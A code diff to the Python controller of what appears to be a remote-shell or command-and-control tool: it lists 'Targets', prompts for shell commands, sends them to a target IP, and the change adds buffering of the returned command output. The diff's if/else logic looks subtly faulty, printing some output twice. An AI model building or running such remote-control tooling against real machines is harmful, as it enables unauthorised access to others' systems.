@@ -20,6 +20,7 @@ class Controller(Host):
     def __init__(self):
         super().__init__()
         self.db = TinyDB('./db.json')
+        self.mock_stdout = ""
 
     def list_hosts(self):
         response = "[ Targets ]\n"
@@ -43,17 +44,22 @@ class Controller(Host):
         sniffer.start()
 
         while True:
-            cmd = input("shell: ").encode()
-            if len(cmd) != 0:
-                self.send(target['ip'], "instruction", cmd)
+            if len(self.mock_stdout) == 0:
+                cmd = input("shell: ").encode()
+                if len(cmd) != 0:
+                    self.send(target['ip'], "instruction", cmd)
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     def instruction(self, shellpack):
         
         if shellpack['option'] == "TRUNCATED":
-            print(shellpack['data'].decode(), end="")
-        # if shellpack['option'] == "ERROR":
-        #     print(f"\n[ERROR] {shellpack['data'].decode()}")
+            self.mock_stdout += shellpack['data'].decode()
+        if shellpack['option'] == "COMPLETED":
+            self.mock_stdout += shellpack['data'].decode()
+            print(self.mock_stdout)
+            self.mock_stdout = ""
+        if shellpack['option'] == "ERROR":
+            print(f"\n[ERROR] {shellpack['data'].decode()}")
         else:
             print(shellpack['data'].decode())
         
